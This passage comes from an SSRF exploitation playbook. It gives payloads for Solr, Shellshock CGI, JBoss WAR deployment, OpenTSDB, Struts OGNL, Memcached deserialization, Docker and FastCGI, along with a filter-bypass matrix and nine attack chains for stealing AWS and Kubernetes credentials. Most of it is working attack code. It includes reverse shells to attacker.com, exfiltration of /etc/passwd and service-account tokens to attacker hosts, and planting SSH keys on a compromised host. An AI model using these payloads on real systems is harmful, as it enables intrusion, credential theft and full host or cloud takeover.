**Bypass logic:** OAuth plugin feature legitimately needs to fetch consumer icons.
No authorization checks on the `consumerUri` parameter. Works on Confluence <6.1.3 and
Jira <7.3.5 (many enterprise installs remain unpatched).

**Attack chain:** SSRF → Jira/Confluence icon-uri → IMDS fetch → AWS credentials

**Stack:** Atlassian Confluence <6.1.3, Jira <7.3.5 (ports 8080, 8443)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Apache Solr Shards SSRF

**Root cause:** Apache Solr's distributed search feature accepts a `shards` parameter that
specifies remote Solr nodes to query. Solr makes server-side HTTP requests to each shard
URL — allowing SSRF via this parameter in the search API.

```
# Solr shards SSRF — trigger callback to SSRF canary
http://127.0.0.1:8983/solr/collection1/select?q=*&shards=http://SSRF_CANARY.oast.fun/

# Internal network scan via shards
http://127.0.0.1:8983/solr/collection1/select?q=*&shards=http://10.0.0.1:9200/solr/dc/select?q=*

# Solr also has XXE via xmlparser
http://127.0.0.1:8983/solr/collection1/select?q=Apple&shards=http://SSRF_CANARY/solr/dc/select?

# Admin API exposure
http://127.0.0.1:8983/solr/admin/cores?action=STATUS
```

**Bypass logic:** Shards parameter is a feature of distributed Solr. Internal Solr APIs
are unauthenticated by default. The search endpoint is widely exposed in dev/staging.

**Attack chain:** SSRF → Solr shards parameter → internal HTTP request → data leak or pivot

**Stack:** Apache Solr (port 8983), Solr cloud clusters

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Shellshock via Internal CGI Through SSRF

**Root cause:** Shellshock (CVE-2014-6271) allows code execution via maliciously crafted
environment variables in bash. CGI scripts pass HTTP headers as env vars. If an internal
web server runs Bash-based CGI and is reachable via SSRF, injecting a Shellshock payload
in a header causes RCE.

```
# SSRF → internal CGI server → Shellshock header injection
# Inject Shellshock via User-Agent in the SSRF-triggered request

# If the SSRF allows setting headers (e.g., webhook with custom headers):
User-Agent: () { foo;}; curl http://SSRF_CANARY.oast.fun/$(cat /etc/passwd | base64)

# Or via the URL itself if the internal service processes headers:
http://127.0.0.1:80/cgi-bin/status
# With injected User-Agent: () { :; }; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Common CGI paths to try:
/cgi-bin/status
/cgi-bin/test.cgi
/cgi-bin/printenv
/cgi-bin/login.cgi
```

**Bypass logic:** The SSRF makes the internal request. The internal CGI server is bash-based
and unpatched (embedded devices, legacy servers). Shellshock triggers on any HTTP header
that becomes an env var.

**Attack chain:** SSRF → internal CGI endpoint → Shellshock header → bash RCE

**Stack:** Apache/nginx with Bash CGI scripts, embedded devices (ports 80, 443, 8080)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## JBoss / WildFly WAR Deployment via SSRF → RCE

**Root cause:** JBoss (now WildFly) exposes a JMX console at `/jmx-console/` that allows
deploying WAR files from a URL via the `MainDeployer` MBean. No authentication is required
in default configurations of JBoss 4.x/5.x. Deploying a WAR containing a webshell yields RCE.

```
# Step 1: Confirm JBoss JMX console via SSRF
http://127.0.0.1:8080/jmx-console/

# Step 2: Deploy malicious WAR from attacker-controlled URL
GET http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://attacker.com/cmd.war

# Step 3: Access the deployed webshell
http://127.0.0.1:8080/cmd/cmd.jsp?cmd=id

# WildFly variant (authenticated deployment):
# POST to /management endpoint with basic auth if credentials known
curl -u admin:password -X POST http://127.0.0.1:9990/management --data '{"operation":"add","address":[{"deployment":"shell.war"}],"content":[{"url":"http://attacker.com/shell.war"}]}'
```

**Bypass logic:** JBoss 4/5 JMX console requires no auth and is internal-only. SSRF
bypasses the network boundary. WAR deploy gives application-level code execution.

**Attack chain:** SSRF → JBoss JMX console → WAR deploy → webshell → OS command execution

**Stack:** JBoss 4.x, 5.x (port 8080, 8443); WildFly with known credentials (port 9990)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## OpenTSDB Command Injection via SSRF

**Root cause:** OpenTSDB's HTTP API passes metric names and tag values to shell commands
without sanitization in older versions. The `/q` endpoint executes gnuplot with parameters
derived from query string values — enabling backtick command injection.

```
# Confirm OpenTSDB via SSRF
http://127.0.0.1:4242/version
http://127.0.0.1:4242/api/version

# Backtick command injection in query parameter
http://127.0.0.1:4242/q?start=2000/10/26-00:00:00&m=sum:sys.cpu.user%7Bhost%3Dweb01%7D&wxh=1900x770`curl%20http://SSRF_CANARY.oast.fun/`&png

# Or via parameter injection:
http://127.0.0.1:4242/q?wxh=1900x770%60curl%20attacker.com%60&png
```

**Bypass logic:** Metric query parameters flow directly into gnuplot command construction
without sanitization. OpenTSDB is deployed in internal analytics/monitoring infrastructure
and is rarely internet-exposed — reachable only via SSRF.

**Attack chain:** SSRF → OpenTSDB /q endpoint → backtick injection → OS command execution

**Stack:** OpenTSDB (port 4242) in Hadoop/HBase analytics stacks

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Hystrix Dashboard SSRF (CVE-2020-5412)

**Root cause:** Netflix Hystrix Dashboard's `/proxy.stream` endpoint proxies Server-Sent
Events (SSE) streams from a user-supplied `origin` URL. No SSRF protections on the origin
parameter — it makes arbitrary HTTP requests on behalf of the requester.

```
# Confirm Hystrix Dashboard via SSRF
http://127.0.0.1:8080/hystrix

# SSRF via proxy.stream — server proxies the SSE stream from the target
http://127.0.0.1:8080/proxy.stream?origin=http://SSRF_CANARY.oast.fun/

# Use to scan internal services
http://127.0.0.1:8080/proxy.stream?origin=http://169.254.169.254/latest/meta-data/

# The response streams back from the internal target
```

**Bypass logic:** The proxy feature is designed for dashboards to pull live metrics. No
auth and no SSRF protection. Common in Spring Boot microservice stacks using Hystrix for
circuit breaking (pre-Spring Cloud 2020.x when Hystrix was deprecated).

**Attack chain:** SSRF → Hystrix /proxy.stream → internal HTTP proxy → IMDS or internal API

**Stack:** Spring Boot + Netflix Hystrix Dashboard (port 8080)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## GitLab Prometheus Redis Key Enumeration via SSRF

**Root cause:** GitLab's internal Prometheus metrics scraper exposes a `/scrape` endpoint
that accepts arbitrary `target` URLs including Redis protocol URIs. This allows reading
arbitrary Redis keys from internal Redis instances by specifying them in `check-keys`.

```
# GitLab internal Prometheus SSRF
# Target path: /-/metrics (GitLab metrics endpoint)
# Internal Prometheus at port 9090 or 9121

# Redis key enumeration via Prometheus redis_exporter target
http://127.0.0.1:9121/scrape?target=redis://127.0.0.1:6379&check-keys=*
http://127.0.0.1:9121/scrape?target=redis://127.0.0.1:7001&check-keys=session:*

# Response contains Redis key values in Prometheus metric format
# Can leak: session tokens, API keys, cached credentials
```

**Bypass logic:** Prometheus exporters take target URLs as parameters by design for
federation. GitLab ships with a `redis_exporter` internally. No auth on internal
Prometheus endpoints.

**Attack chain:** SSRF → GitLab Prometheus redis_exporter → Redis key dump → session tokens / API keys

**Stack:** GitLab CE/EE with internal Prometheus (port 9121 for redis_exporter)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Apache Struts OGNL Injection via SSRF (Struts2-016)

**Root cause:** Apache Struts 2 (pre-2.3.15.1) processes `redirect:` and `redirectAction:`
prefixes in the `action` URL parameter as OGNL expressions. If an internal Struts
application is reachable via SSRF, appending this suffix triggers server-side OGNL
evaluation — arbitrary Java/OS execution.

```
# Append to any Struts action URL via SSRF
http://127.0.0.1:8080/struts-app/login.action?redirect:%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%7D

# Simpler OGNL RCE payload:
http://127.0.0.1:8080/app/index.action?redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("id"),#b=new+java.io.InputStreamReader(#a.getInputStream()),#c=new+com.opensymphony.xwork2.util.TextParseUtil(),#c.toString()}

# Or use S2-016 scanners:
# python struts-016.py http://127.0.0.1:8080/index.action "id"
```

**Bypass logic:** `redirect:` is a legitimate Struts feature. OGNL evaluation in URL params
is the root cause. Internal Struts apps often unpatched (legacy J2EE stacks).

**Attack chain:** SSRF → internal Struts 2 app → OGNL injection → Java runtime → OS RCE

**Stack:** Apache Struts 2 <2.3.15.1 (port 8080, 8443) in J2EE applications

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Memcached Deserialization RCE via Gopher (Enhanced)

**Root cause:** Applications using Memcached for session storage (vBulletin, GitHub
Enterprise, PHP apps with serialize()) write serialized objects to cache. By overwriting
a session key via gopher with a malicious serialized payload, the next time the app reads
that key it deserializes attacker-controlled data — triggering RCE.

```
# Step 1: Set malicious serialized payload in Memcached key via SSRF + gopher
# Python pickle deserialization payload:
gopher://192.168.10.12:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a

# Step 2: Trigger the application to read the key (visit the app as the victim session)
# Step 3: App deserializes → payload executes → RCE

# Ruby Marshal deserialization:
python3 gopherus.py --exploit memcache
# → select Ruby/Python/PHP → enter command → copy gopher URL

# Port scan for Memcached first:
http://127.0.0.1:11211/
```

**Bypass logic:** The existing coverage addresses basic cache poisoning. The deserialization
angle is more impactful: apps that use `unserialize()` / `pickle.loads()` on cached data
turn cache writes into RCE, not just cache poisoning.

**Attack chain:** SSRF → gopher Memcached write → malicious serialized session → app deserializes → RCE

**Stack:** PHP (unserialize), Python (pickle), Ruby (Marshal) apps using Memcached session storage

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Threat Model

> Current patterns as of 2026-05-21. Updated this session.

**What's being exploited in the wild:**

1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
   #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
   og:image generators. The renderer fetches attacker-controlled HTML, which includes
   `<script>` that hits internal metadata.

2. **IMDSv1 still common** — Despite AWS pressure to upgrade, IMDSv1 is found in
   ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
   and inherited deployments keep it alive. Always try IMDSv1 first.

3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`) and K8s
   service account tokens (`file:///var/run/secrets/...`) are the most impactful
   targets. Both yield short-lived IAM credentials or cluster API access.

4. **Webhook features as SSRF entry points** — Every app that allows users to configure
   webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
   webhook + IMDSv1 = critical AWS credential theft.

5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
   block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
   to reach internal services via `http://`.

6. **Enterprise software SSRF (Confluence/Jira/WebLogic)** — CVE-2017-9506 (Jira/Confluence
   OAuth icon-uri) and CVE-2014-4210 (WebLogic UDDI Explorer) remain unpatched in internal
   enterprise networks. Reliable SSRF-to-internal-pivot vectors in corporate bug bounty programs.

7. **307 redirect as IMDSv2 bypass** — HTTP 307 redirects preserving PUT method/body are
   the emerging technique for defeating IMDSv2 token requirements. SSRF validators that
   follow redirects without re-checking the destination are vulnerable to this.

8. **XSLT/XML as underreported SSRF vector** — File upload features accepting XSLT
   stylesheets or XML with custom processing are consistently overlooked. The `document()`
   function gives full SSRF capability without triggering traditional SSRF detection signatures.

9. **Internal monitoring stacks as pivot** — Prometheus, Grafana, Hystrix dashboards, and
   metrics exporters sit alongside every microservice and almost never have SSRF protections.
   Once internal HTTP access is established, these become secondary SSRF + data exfil vectors.

10. **FastCGI (port 9000) is a high-yield target** — PHP applications often run with PHP-FPM
    exposing FastCGI on TCP 9000 internally. SSRF → FastCGI → PHP_VALUE injection is one
    of the most reliable SSRF-to-RCE paths in PHP stacks without needing Redis or Memcached.

---

## Bypass Matrix

| Filter Type | Best Bypass | Notes |
|-------------|-------------|-------|
| Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
| Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
| Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
| Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
| Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
| PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
| Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
| TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
| DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
| IMDSv2 required | 307 redirect preserving PUT + body; or gopher:// with headers | 307 preserves method/body through redirect |
| String blocks IP/localhost | `127.0.0.1.nip.io`, `localtest.me`, `localh.st` | Wildcard DNS → real IP, bypasses string check |
| Multi-library validation | `http://1.1.1.1 &@2.2.2.2#@3.3.3.3/` | urllib2/requests/urllib resolve differently |
| Blocks standard schemes | XSLT `document()`, XXE external entity | XML-layer SSRF bypasses HTTP-layer filters |
| gopher:// blocked | dict:// for banner grab; HTTP open redirect chain to internal | Fallback protocol chain |

---

## High-Value Targets

| Target Stack / Feature | Why High Value | Impact |
|-----------------------|----------------|--------|
| PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
| Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
| Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
| OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
| Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
| XSLT stylesheet upload / XML with `document()` | XSLT processor fetches URLs during transform | Blind SSRF bypassing HTTP-layer controls |
| Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
| Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
| Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
| ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
| FastCGI at `127.0.0.1:9000` | PHP-FPM TCP socket, unauthenticated | gopher → PHP_VALUE injection → RCE |
| Docker daemon at `127.0.0.1:2375` | Unauthenticated REST API | Privileged container → host root |
| Jira/Confluence `icon-uri` (CVE-2017-9506) | OAuth consumer icon fetch, no auth | Internal network scan + IMDS |
| WebLogic UDDI Explorer (CVE-2014-4210) | UDDI service makes user-supplied HTTP request | Internal port scan + data fetch |
| Apache Solr `shards` parameter | Distributed query fetches each shard URL | Internal HTTP request, data leak |
| Hystrix Dashboard `/proxy.stream` (CVE-2020-5412) | SSE proxy with no SSRF protection | Internal HTTP proxy → IMDS / API |
| Zabbix agent at port 10050 | Remote commands if EnableRemoteCommands=1 | gopher → OS command execution |
| Java RMI at port 1099 | Unauthenticated deserialization | gopher → ysoserial → RCE |
| Internal SMTP relay (port 25) | Trusts loopback connections | gopher → send email as any internal user |
| MySQL at `127.0.0.1:3306` | Often root with no password in dev/staging | gopher → LOAD_FILE / file write → RCE |

---

## Real-World Chains

### Chain 1: Webhook SSRF → IMDSv1 → S3 Data Exfil

```
1. App allows user to configure webhook URL
2. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Trigger the webhook (submit a form, create a resource, etc.)
4. Response contains role name → fetch credentials:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
5. Exfil: AccessKeyId + SecretAccessKey + SessionToken
6. Configure AWS CLI → aws s3 ls → dump all S3 buckets
7. aws secretsmanager list-secrets → dump RDS passwords, API keys, etc.

Impact: Critical — full AWS account access
Real example: Capital One breach (2019), GitLab HackerOne report #1116226
```

### Chain 2: PDF Generator SSRF → K8s Service Account → Cluster Takeover

```
1. App has HTML-to-PDF feature (report generation, invoice download)
2. Inject iframe or fetch in HTML template:
   <script>
   fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token')
     .then(r=>r.text())
     .then(t=>fetch('https://attacker.com/token?t='+t))
   </script>
3. PDF service renders HTML in headless browser inside K8s pod
4. Service account token exfilled to attacker
5. Use token with K8s API:
   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
6. List all secrets in all namespaces → DB passwords, API keys, other service account tokens

Impact: Critical — full K8s cluster secret access
```

### Chain 3: SSRF → Redis Gopher → RCE → Reverse Shell

```
1. Find SSRF in imageUrl parameter
2. Confirm Redis at 127.0.0.1:6379 via dict://127.0.0.1:6379/info (check INFO response)
3. Generate cron-based reverse shell via Gopherus:
   python3 gopherus.py --exploit redis
   → select cronjob → enter reverse shell → copy gopher:// payload
4. Send via SSRF:
   imageUrl=gopher://127.0.0.1:6379/_%2A...ENCODED-CRON-PAYLOAD...
5. Cron executes → reverse shell on port 4444

Impact: Critical — RCE on server
```

### Chain 4: Blind SSRF → Internal Jenkins → Groovy RCE

```
1. Blind SSRF confirmed via OOB DNS callback
2. Port scan internal range: try 127.0.0.1:8080 — check error vs timeout
3. Fetch http://127.0.0.1:8080/script → Jenkins script console (often unauthenticated internally)
4. POST to /script:
   script=def+cmd="id".execute();def+out=new+StringBuffer();
   cmd.consumeProcessOutputStream(out);cmd.waitFor();println(out)
5. Response contains command output

Impact: Critical — RCE via internal Jenkins
```

### Chain 5: SSRF → ECS Task Credentials → Cross-Account Pivot

```
1. SSRF in containerized app (ECS Fargate)
2. Fetch: http://169.254.170.2/v2/metadata → extract CredentialsRelativeUri
3. Fetch: http://169.254.170.2/v2/credentials/<ID> → AWS temp creds
4. Assume role with trust policy:
   aws sts assume-role --role-arn arn:aws:iam::OTHER-ACCOUNT:role/admin --role-session-name pwned
5. Pivot to a different AWS account in the organization

Impact: Critical — cross-account AWS access
```

### Chain 6: SSRF → FastCGI (PHP-FPM) → RCE

```
1. SSRF found in imageUrl/webhook parameter of a PHP application
2. Confirm PHP-FPM is running via port scan:
   dict://127.0.0.1:9000/  → check timeout vs RST (open vs closed)
3. Generate FastCGI gopher payload with Gopherus:
   python3 gopherus.py --exploit fastcgi
   → enter SCRIPT_FILENAME: /var/www/html/index.php
   → enter command: bash -i >& /dev/tcp/attacker.com/4444 0>&1
   → copy gopher:// URL
4. Send via SSRF:
   imageUrl=gopher://127.0.0.1:9000/_[FastCGI payload]
5. PHP-FPM processes the request with PHP_VALUE override → auto_prepend_file = php://input
6. PHP executes injected code → reverse shell

Impact: Critical — RCE on PHP server
Stack: PHP-FPM with FastCGI TCP socket
```

### Chain 7: SSRF → Docker API → Privileged Container → Host Root

```
1. SSRF found (any vector)
2. Probe Docker API:
   http://127.0.0.1:2375/version → response confirms Docker version
3. Create privileged container with host filesystem mount:
   POST http://127.0.0.1:2375/containers/create
   Body: {"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh -c 'id && cat /etc/shadow'"],"Binds":["/:/mnt"],"Privileged":true}
4. Start container:
   POST http://127.0.0.1:2375/containers/pwned/start
5. Logs show command output from host:
   GET http://127.0.0.1:2375/containers/pwned/logs?stdout=1
6. For persistent access: write SSH key to /mnt/root/.ssh/authorized_keys

Impact: Critical — full host compromise from container SSRF
Stack: Any Docker host with -H tcp://0.0.0.0:2375
```

### Chain 8: XSLT Upload → Internal Service Scan → Credential Exfil

```
1. Application accepts XSLT stylesheet uploads (report templates, data transformations)
2. Upload malicious XSLT with document() calls:
   <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
3. Trigger the transformation (process a document with the stylesheet)
4. Response contains role name from IMDS
5. Fetch credentials:
   <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE')"/>
6. Response embeds AccessKeyId + SecretAccessKey + Token in the transformed output
7. Use credentials with AWS CLI → pivot to S3, Secrets Manager, etc.

Impact: Critical — SSRF via XML layer, bypasses traditional SSRF filters
Stack: Java (Saxon/Xalan), PHP (XSLTProcessor), Python (lxml) XSLT engines
```

### Chain 9: Jira/Confluence SSRF → Internal Network Pivot → IMDS

```
1. Access to internal corporate network (VPN) or via another SSRF pointing at Confluence
2. Probe Confluence/Jira icon-uri endpoint:
   http://confluence.corp:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY.oast.fun/
3. Confirm SSRF via OOB callback
4. Use as pivot to reach cloud metadata from on-prem Confluence hosted in AWS:
   http://confluence.corp:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
5. Response proxied back → AWS credentials for Confluence EC2 instance role
6. If Confluence has admin-level AWS permissions → full cloud pivot

Impact: High/Critical — SSRF via enterprise software, IMDS access
Stack: Atlassian Confluence <6.1.3, Jira <7.3.5 (CVE-2017-9506)
```
